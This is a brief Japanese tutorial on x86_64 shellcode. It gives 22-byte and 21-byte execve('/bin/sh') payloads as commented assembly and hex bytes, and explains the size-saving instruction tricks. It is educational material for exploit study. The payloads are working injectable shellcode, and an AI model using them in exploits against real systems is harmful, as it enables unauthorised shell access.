# シェルコード

一般にシェルコードと言ったらシェルを開くコードを指します。

ここでは x86_64 のシェルコードについて扱います。

## 22 Byte

多分今一番短いとされているシェルコードです。

目標は execve('/bin/sh',0,0) を呼び出す事になります。システムコールを呼び出す時は、

- rax : システムコール番号
- rdi : 第一引数
- rsi : 第二引数
- rdx : 第三引数
- ...

という形になります。

```
section .text
    global _start
_start:
    xor rsi, rsi                ; rsi (第二引数)を 0 にする
    push rsi                    ; NULL をスタックに置く ('/bin//sh' の末端用)
    mov rdi, 0x68732f2f6e69622f ; rdi に '/bin//sh' を入れる
    push rdi                    ; '/bin//sh' をスタックに置く
    push rsp                    ; '/bin//sh' のアドレスをスタックに置く
    pop rdi                     ; rdi (第一引数) に '/bin//sh' のアドレスを入れる
    mov al, 0x3b                ; システムコール番号を0x3b (execve) にする
    cdq                         ; eax を符号拡張して edx:eax にする (第三引数である rdx を 0 にする)
    syscall;                    ; execve('/bin/sh',0,0)
```

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```


### 賢いポイント

- ```mov rsi, 0``` ではなく、```xor rsi, rsi``` にしている点
- ```mov rdi, rsp``` ではなく、```push rsp; pop rdi``` にしている点
- ```mov rax, 0x3b``` ではなく、```mov al, 0x3b``` にしている点
- ```xor rdx, rdx``` ではなく、```cdq``` で 0 にしている点

これらの工夫により、22 Byteという超絶ショートシェルコードを実現できている訳です。

[引用](https://www.exploit-db.com/exploits/47008)

## 21 Byte

通常はシェルコードにNULLを入れるのはよろしくないんですが、入れても大丈夫な場合もあります。そういう時用です。

```
section .text
    global _start
_start:
    xor rsi, rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi
    mov al, 0x3b
    cdq
    syscall;
```

```
\x48\x31\xf6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

'/bin//sh' だった部分が '/bin/sh\x00' になった分、NULL をスタックに置く必要がなくなって 1 バイト縮んだだけです。